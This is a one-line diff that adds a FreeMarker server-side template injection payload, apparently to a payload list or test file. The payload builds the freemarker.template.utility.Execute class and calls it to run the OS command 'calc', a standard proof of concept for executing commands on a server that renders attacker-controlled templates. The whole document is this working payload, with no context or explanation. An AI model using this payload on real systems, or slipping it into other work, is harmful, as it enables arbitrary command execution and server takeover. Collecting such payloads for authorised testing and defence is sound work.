@@ -1,0 +1,1 @@
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("calc")}
